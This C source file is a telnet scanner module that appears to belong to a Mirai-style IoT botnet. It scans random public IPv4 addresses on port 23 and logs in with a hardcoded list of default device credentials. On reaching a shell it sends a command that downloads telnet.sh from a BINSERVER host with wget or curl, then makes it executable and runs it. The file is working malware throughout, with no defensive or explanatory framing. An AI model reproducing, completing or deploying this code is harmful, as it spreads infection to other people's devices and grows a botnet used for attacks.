#define _GNU_SOURCE

#include "headers/scanner.h"
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/time.h>

#define TELNET_PORT 23
#define TIMEOUT 3
#define MAX_RETRIES 1
#define SCAN_DELAY 3000
//just a limit

#define MAX_CONCURRENT_PER_THREAD 130
#define SCANNER_THREADS 1

static volatile int scanner_active = 0;


struct telnet_auth {
    char *username;
    char *password;
};

static struct telnet_auth default_creds[] = {
    {"root", "root"},
    {"ftp", "ftp"},
    {"user","user"},
    {"postgres", "postgres"},
    {"root", "xc3511"},
    {"root", "admin"},
    {"admin", "admin"},
    {"root", "888888"},
    {"root", "default"},
    {"root", ""},
    {"root", "password"},
    {"admin", "1234"},
    {"admin", "12345"},
    {"admin", ""},
    {"root", "12345"},
    {"root", "5up"},
    {"root", "12345"},
    {"root", "klv1234"},
    {"root", "anko"},
    {"root", "7ujMko0admin"},
    {"root", "ikwb"},
    {"root", "dreambox"},
    {NULL, NULL}
};

static const unsigned int excludes[] = {
    // Bad ips
    0x00000000,  // 0.0.0.0/8
    0x0A000000,  // 10.0.0.0/8
    0x7F000000,  // 127.0.0.0/8
    0xA9FE0000,  // 169.254.0.0/16
    0xAC100000,  // 172.16.0.0/12
    0xC0A80000,  // 192.168.0.0/16
    0x64400000,  // 100.64.0.0/10
    0x0F000000,  // 15.0.0.0/8 
    0x10000000,  // 16.0.0.0/8
    0x38000000,  // 56.0.0.0/8
    0x03000000,  // 3.0.0.0/8
    0xC6120000,  // 198.18.0.0/15
    0
};

static int is_excluded(unsigned int ip) {
    ip = htonl(ip);
    for(int i = 0; excludes[i]; i++) {
        unsigned int excluded_ip = excludes[i];
        if (excluded_ip == 0x7F000000) {
            if ((ip >> 24) == 0x7F)
                return 1;
        } else if ((ip & 0xFF000000) == excluded_ip) {
            return 1;
        }
    }
    return 0;
}

static int try_auth(int sock, struct telnet_auth *auth, const char *ip, int thread_id) {
    char buffer[1024];
    int ret;
    const char *pass_prompts[] = {"Password:", "password:"};
    const char *shell_prompts[] = {"#", "$", ">"};
    const char *user_prompts[] = {"Login:", "login:", "username:", "Username:"};
    int got_user_prompt = 0;
    int user_attempts = 0;
    while (user_attempts < 30) {
        memset(buffer, 0, sizeof(buffer));
        ret = recv(sock, buffer, sizeof(buffer), MSG_DONTWAIT);
        if (ret > 0) {
            for (int i = 0; i < sizeof(user_prompts)/sizeof(char*); i++) {
                if (strstr(buffer, user_prompts[i])) {
                    got_user_prompt = 1;
                    break;
                }
            }
        }
        if (got_user_prompt) break;
        usleep(100000);
        user_attempts++;
    }
    if (!got_user_prompt) {
        return -1;
    }
    send(sock, auth->username, strlen(auth->username), 0);
    send(sock, "\n", 1, 0);
    int got_pass = 0;
    int attempts = 0;
    while (attempts < 30) {
        memset(buffer, 0, sizeof(buffer));
        ret = recv(sock, buffer, sizeof(buffer), MSG_DONTWAIT);
        if (ret > 0) {
            for (int i = 0; i < sizeof(pass_prompts)/sizeof(char*); i++) {
                if (strstr(buffer, pass_prompts[i])) {
                    got_pass = 1;
                    break;
                }
            }
        }
        if (got_pass) break;
        usleep(100000);
        attempts++;
    }
    if (!got_pass) {
        return -1;
    }
    send(sock, auth->password, strlen(auth->password), 0);
    send(sock, "\n", 1, 0);
    usleep(2000000);
    int got_shell = 0;
    int shell_attempts = 0;
    while (shell_attempts < 30) {
        memset(buffer, 0, sizeof(buffer));
        ret = recv(sock, buffer, sizeof(buffer), MSG_DONTWAIT);
        if (ret > 0) {
            for (int i = 0; i < sizeof(shell_prompts)/sizeof(char*); i++) {
                if (strstr(buffer, shell_prompts[i])) {
                    got_shell = 1;
                    break;
                }
            }
        }
        if (got_shell) break;
        usleep(100000);
        shell_attempts++;
    }
    if (!got_shell) {
        return 0;
    }
    memset(buffer, 0, sizeof(buffer));
    ret = recv(sock, buffer, sizeof(buffer), MSG_DONTWAIT);
    if(ret > 0 && got_shell) {
        char payload[256];
        snprintf(payload, sizeof(payload), 
            "cd /tmp || cd /var || cd /dev/shm;"
            "wget http://%s/telnet.sh; curl -O http://%s/telnet.sh; chmod 777 telnet.sh; sh telnet.sh; ",
            BINSERVER, BINSERVER);
        send(sock, payload, strlen(payload), 0);
        usleep(100000);
        return 1;
    }
    return 0;
}

static void* telnet_scanner_thread(void* arg) {
    int thread_id = *(int*)arg;
    char ips[MAX_CONCURRENT_PER_THREAD][20];
    int socks[MAX_CONCURRENT_PER_THREAD];
    int state[MAX_CONCURRENT_PER_THREAD];
    time_t conn_start_time[MAX_CONCURRENT_PER_THREAD];
    memset(socks, -1, sizeof(socks));
    memset(state, 0, sizeof(state));
    memset(conn_start_time, 0, sizeof(conn_start_time));
    srand(time(NULL) ^ (thread_id << 16));
    while(scanner_active) {
        for (int i = 0; i < MAX_CONCURRENT_PER_THREAD; i++) {
            if (state[i] == 0) {
                unsigned int ip1 = rand() % 255;
                if(is_excluded(ip1 << 24)) continue;
                snprintf(ips[i], sizeof(ips[i]), "%u.%d.%d.%d", ip1, rand() % 255, rand() % 255, rand() % 255);
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock < 0) continue;
                int flags = fcntl(sock, F_GETFL, 0);
                fcntl(sock, F_SETFL, flags | O_NONBLOCK);
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(TELNET_PORT);
                addr.sin_addr.s_addr = inet_addr(ips[i]);
                int res = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
                if (res < 0 && errno != EINPROGRESS) {
                    close(sock);
                    continue;
                }
                socks[i] = sock;
                state[i] = 1;
                conn_start_time[i] = time(NULL);
            }
        }
        fd_set wfds;
        FD_ZERO(&wfds);
        int maxfd = -1;
        for (int i = 0; i < MAX_CONCURRENT_PER_THREAD; i++) {
            if (state[i] == 1 && socks[i] >= 0) {
                FD_SET(socks[i], &wfds);
                if (socks[i] > maxfd) maxfd = socks[i];
            }
        }
        struct timeval tv;
        tv.tv_sec = TIMEOUT;
        tv.tv_usec = 0;
        if (maxfd >= 0) {
            time_t now = time(NULL);
            for (int i = 0; i < MAX_CONCURRENT_PER_THREAD; i++) {
                if (state[i] == 1 && socks[i] >= 0) {
                    if ((now - conn_start_time[i]) >= TIMEOUT) {
                        close(socks[i]);
                        socks[i] = -1;
                        state[i] = 0;
                        conn_start_time[i] = 0;
                        continue;
                    }
                    if (FD_ISSET(socks[i], &wfds)) {
                        int so_error = 0;
                        socklen_t len = sizeof(so_error);
                        getsockopt(socks[i], SOL_SOCKET, SO_ERROR, &so_error, &len);
                        if (so_error == 0) {
                            state[i] = 2;
                        } else {
                            close(socks[i]);
                            socks[i] = -1;
                            state[i] = 0;
                            conn_start_time[i] = 0;
                        }
                    }
                }
            }
        } else {
            usleep(10000);
        }
        for (int i = 0; i < MAX_CONCURRENT_PER_THREAD; i++) {
            if (state[i] == 2 && socks[i] >= 0) {
                int cred_idx = 0;
                try_auth(socks[i], &default_creds[cred_idx], ips[i], thread_id);
                shutdown(socks[i], SHUT_RDWR);
                close(socks[i]);
                socks[i] = -1;
                state[i] = 0;
                conn_start_time[i] = 0;
            }
        }
    }
    for (int i = 0; i < MAX_CONCURRENT_PER_THREAD; i++) {
        if (socks[i] >= 0) {
            shutdown(socks[i], SHUT_RDWR);
            close(socks[i]);
        }
    }
    return NULL;
}

int start_telnet_scanner(void) {
    scanner_active = 1;
    static int thread_ids[SCANNER_THREADS];
    for (int i = 0; i < SCANNER_THREADS; i++) {
        thread_ids[i] = i;
        pthread_t thread;
        pthread_create(&thread, NULL, telnet_scanner_thread, &thread_ids[i]);
        pthread_detach(thread);
    }
    return 0;
}

void stop_telnet_scanner(void) {
    scanner_active = 0;
}
